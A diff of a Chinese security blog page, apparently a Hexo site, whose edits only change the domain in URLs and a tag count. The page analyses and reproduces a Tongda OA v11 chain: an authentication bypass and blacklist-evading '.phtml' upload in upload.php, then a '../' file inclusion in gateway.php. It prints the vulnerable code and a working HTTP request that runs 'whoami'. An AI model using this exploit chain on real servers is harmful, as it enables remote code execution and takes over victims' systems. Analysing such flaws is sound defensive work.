@@ -85,25 +85,25 @@
 <meta name="keywords" content="代码审计,安全研究,PHP-Web安全">
 <meta property="og:type" content="article">
 <meta property="og:title" content="【漏洞分析&amp;漏洞复现】通达OA任意文件上传和文件包含漏洞导致RCE分析及复现">
-<meta property="og:url" content="https://www.securityinfo.cn/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/index.html">
+<meta property="og:url" content="http://www.ja0k.com/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/index.html">
 <meta property="og:site_name" content="SecurityCN&#39;s blog">
 <meta property="og:description" content="【漏洞分析&amp;amp;漏洞复现】通达OA任意文件上传和文件包含漏洞导致RCE分析及复现    漏洞名称 通达OA文件包含漏洞    CVE编号 -   影响范围 通达OA v11版本   威胁等级 高危   公开时间#### 一、事件背景    近日，通达OA在官方论坛发布了紧急通知，提供了针对部分用户反馈遭到勒索病毒攻击的安全加固程序。根据公告，遭受攻击的OA服务器首页被恶意篡改，伪装成OA系统错">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://www.securityinfo.cn/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-19-10-22-41.png">
-<meta property="og:image" content="https://www.securityinfo.cn/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-18-14-06-28.png">
-<meta property="og:image" content="https://www.securityinfo.cn/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-18-14-03-16.png">
-<meta property="og:image" content="https://www.securityinfo.cn/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-18-14-41-32.png">
-<meta property="og:image" content="https://www.securityinfo.cn/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-18-15-01-40.png">
-<meta property="og:image" content="https://www.securityinfo.cn/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-18-15-22-49.png">
-<meta property="og:image" content="https://www.securityinfo.cn/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-18-16-10-21.png">
-<meta property="og:image" content="https://www.securityinfo.cn/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-18-17-29-31.png">
-<meta property="og:image" content="https://www.securityinfo.cn/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-19-09-41-20.png">
-<meta property="og:image" content="https://www.securityinfo.cn/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-19-09-35-20.png">
+<meta property="og:image" content="http://www.ja0k.com/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-19-10-22-41.png">
+<meta property="og:image" content="http://www.ja0k.com/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-18-14-06-28.png">
+<meta property="og:image" content="http://www.ja0k.com/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-18-14-03-16.png">
+<meta property="og:image" content="http://www.ja0k.com/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-18-14-41-32.png">
+<meta property="og:image" content="http://www.ja0k.com/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-18-15-01-40.png">
+<meta property="og:image" content="http://www.ja0k.com/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-18-15-22-49.png">
+<meta property="og:image" content="http://www.ja0k.com/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-18-16-10-21.png">
+<meta property="og:image" content="http://www.ja0k.com/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-18-17-29-31.png">
+<meta property="og:image" content="http://www.ja0k.com/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-19-09-41-20.png">
+<meta property="og:image" content="http://www.ja0k.com/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-19-09-35-20.png">
 <meta property="og:updated_time" content="2020-03-23T16:23:08.344Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="【漏洞分析&amp;漏洞复现】通达OA任意文件上传和文件包含漏洞导致RCE分析及复现">
 <meta name="twitter:description" content="【漏洞分析&amp;amp;漏洞复现】通达OA任意文件上传和文件包含漏洞导致RCE分析及复现    漏洞名称 通达OA文件包含漏洞    CVE编号 -   影响范围 通达OA v11版本   威胁等级 高危   公开时间#### 一、事件背景    近日，通达OA在官方论坛发布了紧急通知，提供了针对部分用户反馈遭到勒索病毒攻击的安全加固程序。根据公告，遭受攻击的OA服务器首页被恶意篡改，伪装成OA系统错">
-<meta name="twitter:image" content="https://www.securityinfo.cn/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-19-10-22-41.png">
+<meta name="twitter:image" content="http://www.ja0k.com/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-19-10-22-41.png">
 
 
 
@@ -133,7 +133,7 @@
 
 
 
-  <link rel="canonical" href="https://www.securityinfo.cn/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/">
+  <link rel="canonical" href="http://www.ja0k.com/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/">
 
 
 
@@ -308,7 +308,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://www.securityinfo.cn/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/">
+    <link itemprop="mainEntityOfPage" href="http://www.ja0k.com/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="扫码关注公众号(SecurityCN)">
@@ -433,7 +433,7 @@
       
 
       
-        <p>【漏洞分析&amp;漏洞复现】通达OA任意文件上传和文件包含漏洞导致RCE分析及复现<br><img src="//www.securityinfo.cn/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-19-10-22-41.png" alt></p>
+        <p>【漏洞分析&amp;漏洞复现】通达OA任意文件上传和文件包含漏洞导致RCE分析及复现<br><img src="//www.ja0k.com/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-19-10-22-41.png" alt></p>
 <table>
 <thead>
 <tr>
@@ -488,26 +488,26 @@
 <td></td>
 </tr>
 </tbody></table>
-<h4 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h4><h5 id="3-1-补丁对比"><a href="#3-1-补丁对比" class="headerlink" title="3.1 补丁对比"></a>3.1 补丁对比</h5><p><a href="http://www.tongda2000.com/news/673.php" target="_blank" rel="noopener">http://www.tongda2000.com/news/673.php</a><br><img src="//www.securityinfo.cn/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-18-14-06-28.png" alt><br><img src="//www.securityinfo.cn/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-18-14-03-16.png" alt></p>
+<h4 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h4><h5 id="3-1-补丁对比"><a href="#3-1-补丁对比" class="headerlink" title="3.1 补丁对比"></a>3.1 补丁对比</h5><p><a href="http://www.tongda2000.com/news/673.php" target="_blank" rel="noopener">http://www.tongda2000.com/news/673.php</a><br><img src="//www.ja0k.com/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-18-14-06-28.png" alt><br><img src="//www.ja0k.com/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-18-14-03-16.png" alt></p>
 <p>根据通达官方的修复说明，需要替换MYOA\webroot下的文件<br>下载官方发布的所有版本的补丁分析后发现：<br>2013/2013增强/2015/2016/2017版本的补丁只有1个文件ispirit\im\upload.php；<br>v11版本的的补丁文件与此次漏洞相关的有ispirit\im\upload.php 和ispirit/interface/gateway.php 等多个文件，所以v11 版本同时受2个漏洞的影响，其他版本暂不确定。</p>
 <p>本次分析以通达v11 版本 为例</p>
 <ul>
 <li>注意：通达OA的php文件采用的是zend54 加密，可以使用 SeayDzend工具进行解密，工具下载地址见附录</li>
 </ul>
-<h6 id="补丁1-ispirit-im-upload-php-任意文件上传漏洞"><a href="#补丁1-ispirit-im-upload-php-任意文件上传漏洞" class="headerlink" title="补丁1: ispirit\im\upload.php 任意文件上传漏洞"></a>补丁1: ispirit\im\upload.php 任意文件上传漏洞</h6><p>对比补丁前后发现 主要是为了修复未登录任意上传文件，有2处更改<br>首先第1处，就是关于登陆验证文件’./auth.php’ 的调用<br><img src="//www.securityinfo.cn/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-18-14-41-32.png" alt><br>但在upload.php未修复前，有一个if判断如果$P存在且非空就不需要经过auth.php验证即可执行后续代码。利用此处逻辑漏洞可绕过登陆验证直接上传文件。补丁文件中是直接强制include_once ‘./auth.php’; 进行登录验证。<br>第2处，修改是在upload.php中 增加了登录的与数据库中的Session校验</p>
+<h6 id="补丁1-ispirit-im-upload-php-任意文件上传漏洞"><a href="#补丁1-ispirit-im-upload-php-任意文件上传漏洞" class="headerlink" title="补丁1: ispirit\im\upload.php 任意文件上传漏洞"></a>补丁1: ispirit\im\upload.php 任意文件上传漏洞</h6><p>对比补丁前后发现 主要是为了修复未登录任意上传文件，有2处更改<br>首先第1处，就是关于登陆验证文件’./auth.php’ 的调用<br><img src="//www.ja0k.com/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-18-14-41-32.png" alt><br>但在upload.php未修复前，有一个if判断如果$P存在且非空就不需要经过auth.php验证即可执行后续代码。利用此处逻辑漏洞可绕过登陆验证直接上传文件。补丁文件中是直接强制include_once ‘./auth.php’; 进行登录验证。<br>第2处，修改是在upload.php中 增加了登录的与数据库中的Session校验</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$time = time();</span><br><span class="line">$sql = &apos;select * from im_recent where ((from_id = \&apos;&apos; . $_SESSION[&apos;LOGIN_UID&apos;] . &apos;\&apos; and to_id = \&apos;&apos; . $DEST_UID . &apos;\&apos;) or (from_id = \&apos;&apos; . $DEST_UID . &apos;\&apos; and to_id = \&apos;&apos; . $_SESSION[&apos;LOGIN_UID&apos;] . &apos;\&apos;)) and type = \&apos;1\&apos;&apos;;</span><br><span class="line">$cursor = exequery(TD::conn(), $sql);</span><br><span class="line">if (0 &lt; mysql_num_rows($cursor)) &#123;</span><br><span class="line">    $sql1 = &apos;UPDATE im_recent SET update_time = \&apos;&apos; . $time . &apos;\&apos; WHERE ((from_id = \&apos;&apos; . $_SESSION[&apos;LOGIN_UID&apos;] . &apos;\&apos; and to_id = \&apos;&apos; . $DEST_UID . &apos;\&apos;) or (from_id = \&apos;&apos; . $DEST_UID . &apos;\&apos; and to_id = \&apos;&apos; . $_SESSION[&apos;LOGIN_UID&apos;] . &apos;\&apos;)) and type = \&apos;1\&apos;&apos;;</span><br><span class="line">    exequery(TD::conn(), $sql1);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $sql2 = &apos;INSERT INTO im_recent (from_id,to_id,update_time,type) VALUES (\&apos;&apos; . $_SESSION[&apos;LOGIN_UID&apos;] . &apos;\&apos;,\&apos;&apos; . $DEST_UID . &apos;\&apos;,\&apos;&apos; . $time . &apos;\&apos;,\&apos;1\&apos;)&apos;;</span><br><span class="line">    exequery(TD::conn(), $sql2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>分析完补丁之后我们来整体分析下存在漏洞upload.php 文件<br>1.先判断$P 参数是否存在调用Session和 auth登录认证，当$P非空时此处可以绕过auth.php登录验证<br>2.判断$DEST_UID是否为空；其次如果DEST_UID 中存在有<code>,</code>，则通过intval获取整数值；最后当$DEST_UID=0时，UPLOAD_MODE要为2 否接收方ID无效。<br><img src="//www.securityinfo.cn/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-18-15-01-40.png" alt><br>3.UPLOAD_MODE 有3种模式，vociemsg\weixunshare\im，其中im是默认模式，<br>$_FILES全局变量大于等于1的时候(就是有文件上传的时候)，会调用<br>upload方法进行处理，这里的文件上传的 name 为name=”ATTACHMENT<br><img src="//www.securityinfo.cn/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-18-15-22-49.png" alt></p>
+<p>分析完补丁之后我们来整体分析下存在漏洞upload.php 文件<br>1.先判断$P 参数是否存在调用Session和 auth登录认证，当$P非空时此处可以绕过auth.php登录验证<br>2.判断$DEST_UID是否为空；其次如果DEST_UID 中存在有<code>,</code>，则通过intval获取整数值；最后当$DEST_UID=0时，UPLOAD_MODE要为2 否接收方ID无效。<br><img src="//www.ja0k.com/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-18-15-01-40.png" alt><br>3.UPLOAD_MODE 有3种模式，vociemsg\weixunshare\im，其中im是默认模式，<br>$_FILES全局变量大于等于1的时候(就是有文件上传的时候)，会调用<br>upload方法进行处理，这里的文件上传的 name 为name=”ATTACHMENT<br><img src="//www.ja0k.com/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-18-15-22-49.png" alt></p>
 <ol start="4">
-<li>跟进inc\utility_file.php 的upload方法,发现有个文件名校验函数is_uploadable<br><img src="//www.securityinfo.cn/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-18-16-10-21.png" alt><br>我们看下关于文件后缀名的获取方式，是通过strrpos 函数获取<code>.</code>最后一次出现的位置开始到后面的3个字符串，不能为<code>php</code>,其实黑名单有很多种方式绕过，比如上传后缀名为<code>.phtml</code>，<code>.cpt</code> 等都可以绕过<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function is_uploadable($FILE_NAME)</span><br><span class="line">&#123;</span><br><span class="line">	$POS = strrpos($FILE_NAME, &quot;.&quot;);</span><br><span class="line"></span><br><span class="line">	if ($POS === false) &#123;</span><br><span class="line">		$EXT_NAME = $FILE_NAME;</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">		if (strtolower(substr($FILE_NAME, $POS + 1, 3)) == &quot;php&quot;) &#123;</span><br><span class="line">			return false;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		$EXT_NAME = strtolower(substr($FILE_NAME, $POS + 1));</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<li>跟进inc\utility_file.php 的upload方法,发现有个文件名校验函数is_uploadable<br><img src="//www.ja0k.com/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-18-16-10-21.png" alt><br>我们看下关于文件后缀名的获取方式，是通过strrpos 函数获取<code>.</code>最后一次出现的位置开始到后面的3个字符串，不能为<code>php</code>,其实黑名单有很多种方式绕过，比如上传后缀名为<code>.phtml</code>，<code>.cpt</code> 等都可以绕过<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function is_uploadable($FILE_NAME)</span><br><span class="line">&#123;</span><br><span class="line">	$POS = strrpos($FILE_NAME, &quot;.&quot;);</span><br><span class="line"></span><br><span class="line">	if ($POS === false) &#123;</span><br><span class="line">		$EXT_NAME = $FILE_NAME;</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">		if (strtolower(substr($FILE_NAME, $POS + 1, 3)) == &quot;php&quot;) &#123;</span><br><span class="line">			return false;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		$EXT_NAME = strtolower(substr($FILE_NAME, $POS + 1));</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
 
 </li>
 </ol>
-<h6 id="补丁2：ispirit-interface-gateway-php-文件包含漏洞"><a href="#补丁2：ispirit-interface-gateway-php-文件包含漏洞" class="headerlink" title="补丁2：ispirit/interface/gateway.php 文件包含漏洞"></a>补丁2：ispirit/interface/gateway.php 文件包含漏洞</h6><p>通过对比v11.3版本的补丁中gateway.php前后代码发现 第47行后面，增加了对url地址种的<code>..</code>符号的判断，防止用户读取其他目录文件。<br><img src="//www.securityinfo.cn/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-18-17-29-31.png" alt><br>通读修复之前的代码发现，整个流程为foreach循环解析$json，如果$key键等于字符串<code>url</code> ,则$url={$key所对应的值}，如果$url非空则调用 ，且数据中包含’general/‘ or ‘ispirit/‘or ‘module/‘时，就会调用include_once对$url进行包含。</p>
+<h6 id="补丁2：ispirit-interface-gateway-php-文件包含漏洞"><a href="#补丁2：ispirit-interface-gateway-php-文件包含漏洞" class="headerlink" title="补丁2：ispirit/interface/gateway.php 文件包含漏洞"></a>补丁2：ispirit/interface/gateway.php 文件包含漏洞</h6><p>通过对比v11.3版本的补丁中gateway.php前后代码发现 第47行后面，增加了对url地址种的<code>..</code>符号的判断，防止用户读取其他目录文件。<br><img src="//www.ja0k.com/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-18-17-29-31.png" alt><br>通读修复之前的代码发现，整个流程为foreach循环解析$json，如果$key键等于字符串<code>url</code> ,则$url={$key所对应的值}，如果$url非空则调用 ，且数据中包含’general/‘ or ‘ispirit/‘or ‘module/‘时，就会调用include_once对$url进行包含。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">if ($json) &#123;</span><br><span class="line">	$json = stripcslashes($json);</span><br><span class="line">	$json = (array) json_decode($json);</span><br><span class="line"></span><br><span class="line">	foreach ($json as $key =&gt; $val ) &#123;</span><br><span class="line">		if ($key == &quot;data&quot;) &#123;</span><br><span class="line">			$val = (array) $val;</span><br><span class="line"></span><br><span class="line">			foreach ($val as $keys =&gt; $value ) &#123;</span><br><span class="line">				$keys = $value;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		if ($key == &quot;url&quot;) &#123;</span><br><span class="line">			$url = $val;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if ($url != &quot;&quot;) &#123;</span><br><span class="line">		if (substr($url, 0, 1) == &quot;/&quot;) &#123;</span><br><span class="line">			$url = substr($url, 1);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		if ((strpos($url, &quot;general/&quot;) !== false) || (strpos($url, &quot;ispirit/&quot;) !== false) || (strpos($url, &quot;module/&quot;) !== false)) &#123;</span><br><span class="line">			include_once $url;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
 
 <p>那么就可以在url中传入<code>../</code> 进行跨目录，从而可以包含第1个漏洞上传的php文件，造成RCE</p>
-<h4 id="四、漏洞复现"><a href="#四、漏洞复现" class="headerlink" title="四、漏洞复现"></a>四、漏洞复现</h4><p>*本次复现以通达OAv11.3 版本 为例<br>第1个漏洞的Poc的构造需要满足四个条件: P非空、DEST_UID非空且为数字、UPLOAD_MODE为1或2或3、ATTACHMENT的filename后缀名不能为<code>php</code><br>最后构造的Payload如下<br><img src="//www.securityinfo.cn/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-19-09-41-20.png" alt><br>上传了1个文件名为<code>a.phtml</code>的php文件 绕过黑名单检测<br>路径为 attach/im/2003/72566742.a.phtml  但该目录不在webroot下不能直接执行webshell，才需要利用后面的文件包含漏洞跨目录解析<br><img src="//www.securityinfo.cn/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-19-09-35-20.png" alt></p>
+<h4 id="四、漏洞复现"><a href="#四、漏洞复现" class="headerlink" title="四、漏洞复现"></a>四、漏洞复现</h4><p>*本次复现以通达OAv11.3 版本 为例<br>第1个漏洞的Poc的构造需要满足四个条件: P非空、DEST_UID非空且为数字、UPLOAD_MODE为1或2或3、ATTACHMENT的filename后缀名不能为<code>php</code><br>最后构造的Payload如下<br><img src="//www.ja0k.com/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-19-09-41-20.png" alt><br>上传了1个文件名为<code>a.phtml</code>的php文件 绕过黑名单检测<br>路径为 attach/im/2003/72566742.a.phtml  但该目录不在webroot下不能直接执行webshell，才需要利用后面的文件包含漏洞跨目录解析<br><img src="//www.ja0k.com/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/2020-03-19-09-35-20.png" alt></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /ispirit/interface/gateway.php HTTP/1.1</span><br><span class="line">Host: 192.168.80.1:8000</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie:PHPSESSID=pr7a35d0sh8gheukb4mg6990h4;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 70</span><br><span class="line"></span><br><span class="line">json=&#123;&quot;url&quot;:&quot;module/../../attach/im/2003/72566742.a.phtml&quot;&#125;&amp;cmd=whoami</span><br></pre></td></tr></table></figure>
 
 <p>最后RCE成功，有一点需要提醒下，通达OA开启了 disable_funcation 功能 很多常见的命令执行函数如 exec、eval、system等都被禁止了，需要bypass<br>想学习绕过的可以参考：<br><code>https://www.cnblogs.com/-qing-/p/10944118.html</code></p>
@@ -569,7 +569,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="https://www.securityinfo.cn/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/" title="【漏洞分析&漏洞复现】通达OA任意文件上传和文件包含漏洞导致RCE分析及复现">https://www.securityinfo.cn/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/</a>
+    <a href="http://www.ja0k.com/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/" title="【漏洞分析&漏洞复现】通达OA任意文件上传和文件包含漏洞导致RCE分析及复现">http://www.ja0k.com/2020/03/17/【漏洞分析&漏洞复现】通达OA任意文件上传漏洞分析及复现/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>
@@ -714,7 +714,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-count">11</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
